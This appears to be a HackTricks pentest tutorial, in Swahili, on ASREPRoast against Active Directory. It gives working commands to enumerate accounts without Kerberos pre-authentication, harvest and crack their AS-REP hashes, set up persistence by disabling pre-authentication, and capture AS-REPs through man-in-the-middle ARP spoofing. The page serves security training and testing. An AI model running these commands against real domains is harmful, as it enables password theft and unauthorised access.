# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ni shambulizi la usalama linalowalenga watumiaji ambao hawana **sifa inayohitajika ya Kerberos pre-authentication**. Kimsingi, udhaifu huu huwawezesha washambuliaji kuomba authentication ya mtumiaji kutoka kwa Domain Controller (DC) bila kuhitaji nenosiri la mtumiaji. Kisha DC hutuma ujumbe uliosimbwa kwa njia fiche kwa kutumia key iliyotokana na nenosiri la mtumiaji, ambao washambuliaji wanaweza kujaribu ku-crack offline ili kugundua nenosiri la mtumiaji.

Mahitaji makuu ya shambulizi hili ni:

- **Ukosefu wa Kerberos pre-authentication**: Watumiaji wanaolengwa hawapaswi kuwa na kipengele hiki cha usalama kimewashwa.
- **Muunganisho wa Domain Controller (DC)**: Washambuliaji wanahitaji access kwa DC ili kutuma requests na kupokea ujumbe uliosimbwa kwa njia fiche.
- **Akaunti ya domain ya hiari**: Kuwa na akaunti ya domain huwawezesha washambuliaji kutambua kwa ufanisi zaidi watumiaji walio katika hatari kupitia LDAP queries. Bila akaunti hiyo, washambuliaji lazima wakisie usernames.

#### Kuhesabu watumiaji walio katika hatari (kunahitaji domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Ombi la ujumbe wa AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus huomba **RC4** kwa chaguo-msingi, hivyo Event ID **4768** kwa kawaida huonyesha **preauth type 0** na **ticket encryption type 0x17**. Ukiongeza **`/aes`** (au RC4 imezimwa kwa target), tarajia **AES etypes** badala yake.<sup>[[2]](#references)</sup>

#### One-liners za haraka (Linux)

- Orodhesha kwanza targets zinazowezekana (kwa mfano, kutoka kwenye build paths zilizovuja) ukitumia Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Fanya roast kwa orodha nzima ya usernames bila kutumia creds halali ukitumia NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Ikiwa una creds, acha NetExec iulize LDAP na ikuombee kila account inayoweza ku-roastiwa: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Ikiwa output inaanza na **`$krb5asrep$23$`**, ivunje kwa Hashcat **`-m 18200`**. Ikiwa inaanza na **`$krb5asrep$17$`** au **`$krb5asrep$18$`**, pendelea John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Kuvunja

Usidhani kuwa kila AS-REP roast ni RC4. Tooling ya kisasa inaweza kurudisha **RC4** (`$krb5asrep$23$`) au **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) kulingana na enctype iliyoombwa/kukubaliwa. **`hashcat -m 18200`** ni ya **etype 23**, huku **John** ikishughulikia `krb5asrep` moja kwa moja kwa **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

Lazimisha **preauth** isihitajike kwa mtumiaji ambaye una ruhusa za **GenericAll** (au ruhusa za kuandika properties):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast bila credentials

Mshambuliaji anaweza kutumia nafasi ya man-in-the-middle kukamata pakiti za AS-REP zinapopitia kwenye mtandao bila kutegemea Kerberos pre-authentication kuzimwa. Kwa hivyo, inafanya kazi kwa users wote walio kwenye VLAN.\
Ikiwa unataka no-credential trick inayohusiana ambayo hurejesha **service ticket** badala ya **TGT** kutoka kwa principal ya no-preauth, tazama [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) hutuwezesha kufanya hivyo. Mode ya `relay` ndiyo inayovutia zaidi kwa upande wa offensively kwa sababu inaweza kulazimisha **RC4** wakati client bado inatangaza **etype 23**; `listen` hubaki passive na hukamata tu kile client/DC walichokubaliana.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Marejeleo

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
